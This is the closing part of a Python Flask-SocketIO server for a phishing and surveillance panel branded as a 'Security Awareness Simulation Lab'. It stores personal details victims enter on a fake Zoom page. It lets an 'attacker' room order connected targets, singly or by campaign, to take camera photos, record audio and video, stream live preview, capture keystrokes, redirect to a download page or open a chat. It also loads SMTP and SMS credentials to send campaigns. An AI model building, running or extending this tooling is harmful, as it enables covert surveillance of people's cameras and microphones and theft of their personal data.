@socketio.on("zoom_ped_final_submission")
def on_zoom_ped_final_submission(data):
    sid = request.sid
    alias = data.get("alias", "unknown")
    safe_alias = safe_name(alias)
    slug = data.get("slug", "")
    ped_data = data.get("data", {})
    if not ped_data:
        return
    content = f"--- ZOOM PED DATA ---\n"
    content += f"Name: {ped_data.get('name', 'N/A')}\n"
    content += f"Age: {ped_data.get('age', 'N/A')}\n"
    content += f"Address: {ped_data.get('address', 'N/A')}\n"
    content += f"Numero: {ped_data.get('number', 'N/A')}\n"
    content += f"Email: {ped_data.get('email', 'N/A')}\n"
    content += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "---------------------\n"
    try:
        fname = f"info_{safe_alias}_{datetime.now().strftime('%H%M%S')}.txt"
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        fpath = os.path.join(target_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(content)
        log_event("info", f"SUCCESS: Zoom PED info saved for {alias}", slug)
        t = targets.get(sid, {})
        save_capture(t.get("id", ""), slug, "info", fpath)
        socketio.emit("info_received", {
            "sid": sid, "alias": alias, "fname": fname,
            "url": f"/uploads/{safe_alias}/{fname}", "slug": slug,
            "time": datetime.now().strftime("%H:%M:%S"),
        }, room="attacker")
    except Exception as e:
        log_event("error", f"Zoom PED info save failed: {e}")

# ── Socket: Attacker ──
@socketio.on("attacker_connect")
def on_attacker_connect():
    join_room("attacker")
    events.clear()
    log_event("attacker", "Attacker panel connected")
    fc = count_file_captures()
    emit("init_state", {
        "targets": list(targets.values()),
        "campaigns": get_all_campaigns(),
        "events": list(events),
        "token": ATTACKER_URL_TOKEN,
        "counts": fc,
        "stats": get_stats_summary(),
    })

@socketio.on("cmd_capture_photo")
def cmd_capture_photo(data):
    sid = data.get("sid", "all")
    if sid == "all":
        socketio.emit("do_capture_photo", {}, room="targets")
        log_event("command", "Capture -> ALL targets")
    else:
        socketio.emit("do_capture_photo", {}, to=sid)
        log_event("command", f"Capture -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_start_audio_recording")
def cmd_start_audio_recording(data):
    sid = data.get("sid", "all")
    dur = data.get("duration", 10)
    if sid == "all":
        socketio.emit("do_start_audio_recording", {"duration": dur}, room="targets")
        log_event("command", f"Audio ({dur}s) -> ALL")
    else:
        socketio.emit("do_start_audio_recording", {"duration": dur}, to=sid)
        log_event("command", f"Audio ({dur}s) -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_capture_keylog")
def cmd_capture_keylog(data):
    sid = data.get("sid")
    if sid == "all":
        socketio.emit("do_capture_keylog", {}, room="targets")
        log_event("command", "Capture Keylog -> ALL")
    elif sid:
        socketio.emit("do_capture_keylog", {}, to=sid)
        log_event("command", f"Capture Keylog -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_toggle_live_preview")
def cmd_toggle_live_preview(data):
    sid = data.get("sid")
    active = data.get("active", False)
    if sid:
        socketio.emit("do_toggle_live_preview", {"active": active}, to=sid)
        log_event("command", f"{'Start' if active else 'Stop'} Live Preview -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_switch_camera")
def cmd_switch_camera(data):
    sid = data.get("sid")
    facing = data.get("facing", "user")
    if sid:
        socketio.emit("do_switch_camera", {"facing": facing}, to=sid)
        t = targets.get(sid, {})
        t['facing'] = facing
        log_event("camera", f"Switch to {facing} -> {t.get('alias','?')}", t.get('slug',''))

@socketio.on("cmd_capture_campaign")
def cmd_capture_campaign(data):
    slug = data.get("slug")
    sids = [s for s, t in targets.items() if t.get("slug") == slug]
    for s in sids:
        socketio.emit("do_capture_photo", {}, to=s)
    c = get_or_create_campaign(slug) or {}
    log_event("command", f"Capture -> campaign '{c.get('name', slug)}' ({len(sids)} targets)")

@socketio.on("cmd_start_audio_campaign")
def cmd_start_audio_campaign(data):
    slug = data.get("slug")
    dur = data.get("duration", 10)
    sids = [s for s, t in targets.items() if t.get("slug") == slug]
    for s in sids:
        socketio.emit("do_start_audio_recording", {"duration": dur}, to=s)
    c = get_or_create_campaign(slug) or {}
    log_event("command", f"Audio ({dur}s) -> campaign '{c.get('name', slug)}' ({len(sids)} targets)")

@socketio.on("cmd_start_recording")
def cmd_start_recording(data):
    sid = data.get("sid", "all")
    dur = data.get("duration", 8)
    live = data.get("live", False)
    payload = {"duration": dur, "live": live}
    mode_str = "LIVE" if live else f"{dur}s"
    if sid == "all":
        socketio.emit("do_start_recording", payload, room="targets")
        log_event("command", f"Record {mode_str} -> ALL")
    else:
        socketio.emit("do_start_recording", payload, to=sid)
        log_event("command", f"Record {mode_str} -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_record_campaign")
def cmd_record_campaign(data):
    slug = data.get("slug")
    dur = data.get("duration", 10)
    live = data.get("live", False)
    sids = [s for s, t in targets.items() if t.get("slug") == slug]
    payload = {"duration": dur, "live": live}
    mode_str = "LIVE" if live else f"{dur}s"
    for s in sids:
        socketio.emit("do_start_recording", payload, to=s)
    c = get_or_create_campaign(slug) or {}
    log_event("command", f"Record {mode_str} -> campaign '{c.get('name', slug)}' ({len(sids)} targets)")

@socketio.on("cmd_stop_campaign")
def cmd_stop_campaign(data):
    slug = data.get("slug")
    sids = [s for s, t in targets.items() if t.get("slug") == slug]
    for s in sids:
        socketio.emit("do_stop_recording", {}, to=s)
    c = get_or_create_campaign(slug) or {}
    log_event("command", f"Stop recording -> campaign '{c.get('name', slug)}'")

@socketio.on("cmd_stop_recording")
def cmd_stop_recording(data):
    sid = data.get("sid", "all")
    if sid == "all":
        socketio.emit("do_stop_recording", {}, room="targets")
        log_event("command", "Stop recording -> ALL")
    else:
        socketio.emit("do_stop_recording", {}, to=sid)
        log_event("command", f"Stop recording -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_disconnect_target")
def cmd_disconnect_target(data):
    sid = data.get("sid")
    if sid:
        socketio.emit("do_disconnect", {}, to=sid)
        log_event("command", f"Disconnect -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_redirect_target")
def cmd_redirect_target(data):
    sid = data.get("sid")
    if sid:
        socketio.emit("do_force_redirect", {}, to=sid)
        log_event("command", f"Redirect -> {targets.get(sid,{}).get('alias','?')}")

@socketio.on("cmd_send_to_download")
def cmd_send_to_download(data):
    sid = data.get("sid")
    if sid:
        socketio.emit("do_download_page", {}, to=sid)
        log_event("command", f"Send to download page -> {targets.get(sid,{}).get('alias','?')}")

# ── Chat events ──
@socketio.on("attacker_join_chat")
def on_attacker_join_chat(data):
    target_sid = data.get("sid")
    if target_sid in targets:
        alias = targets[target_sid]["alias"]
        room = f"chat_{alias}"
        join_room(room)
        log_event("chat", f"Attacker joined chat with {alias}", targets[target_sid].get("slug", ""))
        socketio.emit("chat_attacker_joined", {"sid": target_sid, "alias": alias}, room=room)

@socketio.on("chat_message_from_attacker")
def on_chat_message_from_attacker(data):
    target_sid = data.get("sid")
    msg = data.get("message", "").strip()
    if target_sid in targets and msg:
        alias = targets[target_sid]["alias"]
        room = f"chat_{alias}"
        log_event("chat", f"Attacker to {alias}: {msg[:60]}", targets[target_sid].get("slug", ""))
        socketio.emit("chat_message", {"sid": target_sid, "alias": alias, "from": "attacker", "message": msg, "time": datetime.now().strftime("%H:%M")}, room=room)

@socketio.on("chat_message_from_target")
def on_chat_message_from_target(data):
    sid = request.sid
    msg = data.get("message", "").strip()
    if sid in targets and msg:
        alias = targets[sid]["alias"]
        room = f"chat_{alias}"
        log_event("chat", f"Target {alias} to Attacker: {msg[:60]}", targets[sid].get("slug", ""))
        socketio.emit("chat_message", {"sid": sid, "alias": alias, "from": "target", "message": msg, "time": datetime.now().strftime("%H:%M")}, room=room)

@socketio.on("target_join_chat")
def on_target_join_chat(data):
    sid = request.sid
    if sid in targets:
        alias = targets[sid]["alias"]
        room = f"chat_{alias}"
        join_room(room)
        log_event("chat", f"{alias} joined chat", targets[sid].get("slug", ""))
        socketio.emit("chat_message", {"sid": sid, "alias": alias, "from": "system", "message": f"{alias} a rejoint le chat"}, room="attacker")

@socketio.on("cmd_redirect_chat")
def cmd_redirect_chat(data):
    sid = data.get("sid")
    if sid in targets:
        log_event("command", f"Redirect to chat -> {targets[sid].get('alias','?')}", targets[sid].get("slug", ""))
        socketio.emit("do_show_chat", {"sid": sid}, to=sid)

@socketio.on("chat_redirect_done")
def on_chat_redirect_done(data):
    sid = request.sid
    if sid in targets:
        alias = targets[sid]["alias"]
        log_event("chat", f"{alias} joined chat", targets[sid].get("slug", ""))
        socketio.emit("chat_redirect_done", {"sid": sid}, room="attacker")

@socketio.on("disconnect")
def on_disconnect():
    sid = request.sid
    if sid in targets:
        t = targets.pop(sid)
        alias = t["alias"]
        slug = t.get("slug", "")
        log_event("disconnect", f"{alias} left", slug)
        socketio.emit("target_left", {"sid": sid, "alias": alias}, room="attacker")
        threading.Thread(target=webhook_notifier.notify, args=("capture", {"alias": alias, "slug": slug, "type": "leave"}), daemon=True).start()

# ── Boot ──
if __name__ == "__main__":
    import socket as _s
    try:
        s = _s.socket(_s.AF_INET, _s.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
        lan_ip = s.getsockname()[0]; s.close()
    except Exception:
        lan_ip = "127.0.0.1"
    try:
        _migrate_legacy_resources()
    except Exception:
        pass
    load_custom_templates()
    load_campaigns()
    webhook_notifier.load(get_webhook_configs())
    # Load SMS config from DB if exists
    try:
        conn = get_db()
        row = conn.execute("SELECT * FROM sms_config LIMIT 1").fetchone()
        if row:
            r = dict(row)
            sms_sender.configure(provider=r.get("provider","twilio"), account_sid=r.get("account_sid",""), auth_token=r.get("auth_token",""), from_number=r.get("from_number",""), api_key=r.get("api_key",""), sender_id=r.get("sender_id",""))
    except Exception:
        pass
    # Load SMTP config from DB if exists
    try:
        conn = get_db()
        # smtp_config is key/value table originally but now we use single row? Handle both
        try:
            row = conn.execute("SELECT * FROM smtp_config LIMIT 1").fetchone()
            if row and row["host"]:
                d = dict(row)
                email_sender.configure(host=d.get("host",""), port=int(d.get("port",587) or 587), username=d.get("username",""), password=d.get("password",""), use_tls=bool(d.get("use_tls",1)), sender_name=d.get("sender_name","AwareNet"), sender_email=d.get("sender_email",""))
        except Exception:
            pass
    except Exception:
        pass
    try:
        env = {}
        with open(".env") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    env[k.strip()] = v.strip()
        if env.get("SMTP_HOST") and env.get("SMTP_SENDER_EMAIL"):
            email_sender.configure(
                host=env["SMTP_HOST"],
                port=int(env.get("SMTP_PORT", 587)),
                username=env.get("SMTP_USERNAME", ""),
                password=env.get("SMTP_PASSWORD", ""),
                use_tls=env.get("SMTP_USE_TLS", "True").lower() == "true",
                sender_name=env.get("SMTP_SENDER_NAME", "AwareNet"),
                sender_email=env["SMTP_SENDER_EMAIL"],
            )
        if env.get("SMS_PROVIDER") and env.get("SMS_FROM_NUMBER"):
            sms_sender.configure(provider=env.get("SMS_PROVIDER","twilio"), account_sid=env.get("SMS_ACCOUNT_SID",""), auth_token=env.get("SMS_AUTH_TOKEN",""), from_number=env.get("SMS_FROM_NUMBER",""))
    except Exception:
        pass
    env_session_timeout = int(os.environ.get("SESSION_TIMEOUT", "3600"))
    app.config['PERMANENT_SESSION_LIFETIME'] = env_session_timeout
    app.debug = True
    if os.environ.get("WERKZEUG_RUN_MAIN") or not app.debug:
        threading.Thread(target=auto_delete, daemon=True).start()
    if not os.environ.get("WERKZEUG_RUN_MAIN"):
        panel_url = f"http://127.0.0.1:5000/panel/{ATTACKER_URL_TOKEN}"
        print()
        print("="*70)
        print("           AWARENET — Security Awareness Simulation Lab")
        print("="*70)
        print(f"  Panel: {panel_url}")
        print(f"  Password: {ATTACKER_PASSWORD}")
        print(f"  Session timeout: {env_session_timeout}s")
        print(f"  DB: SQLite (awarenet.db)")
        print(f"  SMTP: {'Configured' if email_sender.is_configured() else 'Not configured'}")
        print(f"  SMS: {'Configured' if sms_sender.is_configured() else 'Not configured'}")
        print("="*70)
        print()
    try:
        socketio.run(app, host="0.0.0.0", port=5000, debug=True, allow_unsafe_werkzeug=True)
    except TypeError:
        socketio.run(app, host="0.0.0.0", port=5000, debug=True)
